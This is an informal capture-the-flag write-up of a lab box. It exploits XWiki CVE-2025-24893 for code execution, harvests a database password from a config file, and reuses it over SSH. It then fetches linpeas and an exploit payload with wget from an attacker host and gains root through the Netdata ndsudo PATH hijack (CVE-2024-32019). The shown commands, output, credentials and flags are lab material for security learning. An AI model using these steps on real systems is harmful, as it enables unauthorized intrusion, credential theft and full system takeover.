# Editor

So I _wanted_ to start with a clean Nmap scan like a responsible adult… …but I ran `-p-`, and Nmap basically decided it was going to retire on this box. It just kept scanning forever, and at some point I realized: "“Wait… port 80 is already talking. I don’t actually need Nmap to finish. Nmap can go meditate." So I ditched the scan mid-flight and moved on. And honestly? Didn’t need the full results at all.

***

I hit the site on port 80 and got greeted by a shiny web app.

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

It looked normal at first… which is usually a red flag. So I start clicking around like I’m doing QA testing for free (again). Eventually I spot a Docs link — and a username just sitting there like a breadcrumb trail. I click the username and boom: the app politely tells me what it is: `XWiki Debian 15.10.8` . That’s basically the website whispering: "Please exploit me."

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

A quick search and I find exactly what I wanted to find (and what the server definitely didn’t want me to find):  [https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC).&#x20;

I try the example payload and… _of course_… I get a 500 error. Classic. But while staring at the error page like it personally offended me, I noticed something else:

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

a powered by `jetty:// 10.0.20`, Not immediately useful… but I wrote it down because those little details always come back later like a bad sequel.

Next move: run the script included with the PoC, the payload alone was not good enough.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

And this time? It works. We get code execution, upgrade to a stable shell, and now we’re inside the box poking around like we pay rent.

Time to rummage. After checking a few directories, I find a file that screams “credentials live here”: `/etc/xwiki/hibernate.cfg.xml` And sure enough, it contains MySQL connection settings:

```
/etc/xwiki/cache/infinispan/config.xml:44:         We don't use JBossUserMarshaller (the previous default) because it's now deprecated.
/etc/xwiki/hibernate.cfg.xml:102:    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
/etc/xwiki/hibernate.cfg.xml:103:    <property name="hibernate.connection.username">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:104:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
/etc/xwiki/hibernate.cfg.xml:105:    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
/etc/xwiki/hibernate.cfg.xml:119:    <!-- MySQL configuration.
```

Ohhh that’s _delicious_. So we’ve got: `xwiki:theEd1t0rTeam99` Now let’s see what’s inside MySQL.

```shellscript
<ervation/remote/jgroups$ mysql -h localhost -u xwiki -p                     
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 27
Server version: 8.0.42-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

```

I poke around a bit, google what XWiki stores where, and realize: “This doesn’t actually store the user account data I want.” So… database = dead end. But the password we found looks _very_ reusable. And we already have a username from earlier. So let’s do what hackers do best: password reuse gambling.

Try SSH with oliver:

```shellscript
$ ssh oliver@10.129.57.129
The authenticity of host '10.129.57.129 (10.129.57.129)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.57.129' (ED25519) to the list of known hosts.
oliver@10.129.57.129's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jan 26 08:14:52 AM UTC 2026

  System load:  0.15              Processes:             245
  Usage of /:   65.6% of 7.28GB   Users logged in:       0
  Memory usage: 54%               IPv4 address for eth0: 10.129.57.129
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 26 08:14:52 2026 from 10.10.15.84
oliver@editor:~$ 
```

Nice. We are officially a real user now.

First order of business: flag collection. Always.

```shellscript
oliver@editor:/tmp$ cd /home/oliver/
oliver@editor:~$ ls
user.txt
oliver@editor:~$ cat user.txt 
682d71d04b3d6959c18f4abf5558d7dc
```

> **User flag:** 682d71d04b3d6959c18f4abf5558d7dc

Now… root.

Upload and run linpeas:

```shellscript
oliver@editor:/tmp$ wget http://10.10.15.84:8000/linpeas.sh
--2026-01-26 08:17:12--  http://10.10.15.84:8000/linpeas.sh
Connecting to 10.10.15.84:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1007100 (983K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                            100%[======================================================================>] 983.50K  --.-KB/s    in 0.05s   

2026-01-26 08:17:12 (18.3 MB/s) - ‘linpeas.sh’ saved [1007100/1007100]
```

LinPEAS starts screaming the usual stuff, but then something stands out: We are in the `netdata` group. And then it shows a very spicy list of root-owned files that we can read / execute:

```shellscript
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-rw---- 1 root netdata 4 Jan 26 07:19 /run/ebpf.pid
-rw-r----- 1 root oliver 33 Jan 26 07:19 /home/oliver/user.txt
-rwxr-x--- 1 root netdata 21948 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/charts.d.plugin
-rwsr-x--- 1 root netdata 965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
-rwxr-x--- 1 root netdata 860296 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin
-rwxr-x--- 1 root netdata 886928 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin
-rwsr-x--- 1 root netdata 1377624 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
-rwxr-x--- 1 root netdata 1437424 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/apps.plugin
-rwxr-x--- 1 root netdata 70000792 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin
-rwxr-x--- 1 root netdata 10328 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network-helper.sh
-rwxr-x--- 1 root netdata 27998 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/python.d.plugin
-rwsr-x--- 1 root netdata 1144224 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 81472 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping
-rwsr-x--- 1 root netdata 896448 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
-rwsr-x--- 1 root netdata 4261672 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
-rwxr-x--- 1 root netdata 6713 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping.plugin
-rwxr-x--- 1 root netdata 863608 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/perf.plugin
```

`ndsudo`? With the setuid bit? Owned by root? Accessible by netdata group? That’s not a file. That’s a privilege escalation invitation.

A quick search confirms the suspicion: [https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC](https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC). PoC exists. Script exists. We are not reinventing the wheel today. The exploit basically lets us hijack PATH so `ndsudo` runs _our_ binary as root. So we grab the PoC + payload.

```shellscript
oliver@editor:/tmp$ wget http://10.10.15.84:8000/script.py
--2026-01-26 08:34:29--  http://10.10.15.84:8000/script.py
Connecting to 10.10.15.84:8000... 
connected.
HTTP request sent, awaiting response... 200 OK
Length: 712 [text/x-python]
Saving to: ‘script.py’

script.py                             100%[======================================================================>]     712  --.-KB/s    in 0s      

2026-01-26 08:34:29 (70.7 MB/s) - ‘script.py’ saved [712/712]

oliver@editor:/tmp$ 
oliver@editor:/tmp$ wget http://10.10.15.84:8000/nvme
--2026-01-26 08:34:39--  http://10.10.15.84:8000/nvme
Connecting to 10.10.15.84:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 766896 (749K) [application/octet-stream]
Saving to: ‘nvme’

nvme                                  100%[======================================================================>] 748.92K  --.-KB/s    in 0.05s   

2026-01-26 08:34:39 (14.6 MB/s) - ‘nvme’ saved [766896/766896]

oliver@editor:/tmp$ ls
netdata-ipc
nvme
script.py
systemd-private-3f49fcf2a2e8429d8aa4cfefe4b6522c-ModemManager.service-iOxSJj
systemd-private-3f49fcf2a2e8429d8aa4cfefe4b6522c-systemd-logind.service-FMU2Ey
systemd-private-3f49fcf2a2e8429d8aa4cfefe4b6522c-systemd-resolved.service-XOgoFi
systemd-private-3f49fcf2a2e8429d8aa4cfefe4b6522c-systemd-timesyncd.service-6PobCT
systemd-private-3f49fcf2a2e8429d8aa4cfefe4b6522c-xwiki.service-WpPqNd
tmux-1000
vmware-root_611-3980232955

```

Everything’s staged. Time to press the big red button.

```shellscript
oliver@editor:/tmp$ bash script.py 
[+] ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
[+] File 'nvme' found in the current directory.
[+] Execution permissions granted to ./nvme
[+] Running ndsudo with modified PATH:
root@editor:/tmp# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
```

That’s root. That’s real root. Not “almost root”. Not “root-ish”. This is the _real deal_.

Let's snatch the root flag:

```shellscript
root@editor:/tmp# cat /root/root.txt
e999e4a6f41a7f7bb114b2798bfeea5b
root@editor:/tmp# 
```

> **Root flag:** e999e4a6f41a7f7bb114b2798bfeea5b

We got it. Grab it. Frame it. Walk away dramatically.
